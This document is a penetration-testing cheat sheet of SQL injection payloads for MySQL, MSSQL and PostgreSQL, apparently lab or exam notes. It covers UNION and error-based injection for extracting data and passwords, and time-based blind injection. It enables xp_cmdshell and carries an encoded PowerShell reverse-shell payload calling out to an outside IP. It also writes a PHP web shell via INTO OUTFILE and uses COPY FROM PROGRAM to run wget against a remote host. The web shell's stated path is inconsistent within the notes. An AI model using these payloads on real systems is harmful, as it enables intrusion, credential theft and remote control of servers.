
##### Note: make sure to check for error messages.
#### Connecting to MySQL
```
mysql -h TARGET_IP -u USERNAME -p   // Remote authentication with username and password
```

```
SELECT @@VERSION;               // Print the SQL version
SELECT system_user();           // Print the current user. Note: this is the database-specific user, it may not be the user of the same name in the system.

SHOW databases;
USE DATABASE_NAME;
SHOW tables;
```


#### MSSQL basics
```
impacket-mssqlclient USER:PASSWORD@IP_ADDRESS -windows-auth
SELECT @@VERSION;

SELECT name FROM master.dbo.sysdatabases               // Show databases
SELECT * FROM TARGET_DB.information_schema.tables;     // Show tables


```


#### Enabled error messages
```
' or 1=1 in (select @@version) -- -                 
' or 1=1 in (SELECT password FROM users) -- -         // might show the passwords in the error message.
```


#### MySQL UNION injection
First, use these payloads ascending until an error occurs:
```
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
```
The last number before the error is the amount of columns in the request. Then, use this payload with the appropriate amount of columns:
```
' UNION SELECT @@version -- -
' UNION SELECT null, @@version -- -
...
' UNION SELECT null, null, database(), user(), @@version  -- -
```
If the payload works, it's time to read the database tables:
```
' union select table_name from information_schema.columns where table_schema=database() -- -
' union select null, table_name from information_schema.columns where table_schema=database() -- -
...
' union select null, null, null, null, table_name from information_schema.columns where table_schema=database() -- -
// options: table_name, column_name, table_schema,
```

If a table is found:
```
' UNION SELECT null, COLUMN_NAME FROM TABLE_NAME -- 
```

#### Blind SQLI
```
http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- -
```



#### MSSQL Code Execution
To get RCE in `MSSQL` using the `xp_cmdshell`, a few conditions need to be met:
- First, *show advanced options* needs to be set to `1`, and a `RECONFIGURE;` command needs to be issued.
- Then, *xp_cmdshell* needs to be set to `1`, and a `RECONFIGURE;` command needs to be issued.
From this point, the `xp_cmdshell` command is unlocked and can be used to get RCE.

##### RCE with credentials
```
impacket-mssqlclient USERNAME:PASSWORD@IP_ADDRESS -windows-auth
// MSSQL, find a way to run these:
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXECUTE xp_cmdshell 'COMMAND';
```

###### Example output
```
kali@kali:~$ impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
...
SQL> EXECUTE sp_configure 'show advanced options', 1;
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE;
SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE;
SQL> EXECUTE xp_cmdshell 'whoami';

```

##### example SQLI
```
// All the steps concentrated into one vulnerable MSSQL parameter with a leading '.
ctl00%24ContentPlaceHolder1%24UsernameTextBox='EXECUTE%20sp_configure%20'show%20advanced%20options',%201;RECONFIGURE;EXECUTE%20sp_configure%20'xp_cmdshell',%201;RECONFIGURE;EXECUTE%20xp_cmdshell%20'powershell%20-e%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEAOQA0ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==';--
```
Note: when trying the individual commands each (non-concentrated), the output did not show any signs of compromise.

#### MySQL Code Execution
MySQL doesn't have any direct functions for running commands, but the `SELECT INTO_OUTFILE` functionality can be abused.
Note: for this to work, the user running the database needs to have `write` permissions where the `OUTFILE` is stored.

Example payload (might produce an error due to the return type, won't affect the result):
```
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/webshell.php" -- -
```
This will write `<?php system($_GET['cmd']);>` into `/var/www/html/tmp/webshell.php`. 


#### PostgreSQL Code Execution
```
';DROP+TABLE+IF+EXISTS+cmd_exec%3b+CREATE+TABLE+cmd_exec(cmd_output+text)%3b+COPY+cmd_exec+FROM+PROGRAM+'wget+http://192.168.45.194/test'+--
```